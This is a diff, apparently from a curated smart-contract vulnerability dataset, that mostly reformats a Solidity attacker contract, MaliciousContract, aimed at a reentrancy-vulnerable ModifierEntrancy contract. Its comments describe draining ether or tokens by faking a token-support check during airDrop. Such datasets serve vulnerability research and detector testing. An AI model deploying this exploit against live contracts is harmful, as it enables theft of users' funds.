+++ smartbugs-curated/0.4.x/contracts/reentrancy/modifier_reentrancy_attack.sol
@@ -2,18 +2,17 @@ pragma solidity ^0.4.10;
 
 import "../dataset/reentrancy/modifier_reentrancy.sol";
 
-contract MaliciousContract{
+contract MaliciousContract {
     ModifierEntrancy modifierentrancy;
     bool public hasBeenCalled;
-    
 
-    constructor(address _victimAddress) public{
-        modifierentrancy= ModifierEntrancy (_victimAddress);
+    constructor(address _victimAddress) public {
+        modifierentrancy = ModifierEntrancy(_victimAddress);
     }
 
-   function initiateAttack() public {
-    // the attack consist on making the contract give as much ether as possible
-    //by pretending the contract has 0 balance and faking the modifier supportsToken
+    function initiateAttack() public {
+        // the attack consist on making the contract give as much ether as possible
+        //by pretending the contract has 0 balance and faking the modifier supportsToken
         modifierentrancy.airDrop();
     }
 
@@ -26,10 +25,8 @@ contract MaliciousContract{
         return (keccak256(abi.encodePacked("Nu Token")));
     }
 
-
     // Helper function to check the token balance
-    function getTokenBalance() public view returns (uint) {
+    function getTokenBalance() public view returns (uint256) {
         return modifierentrancy.tokenBalance(address(this));
     }
-
 }
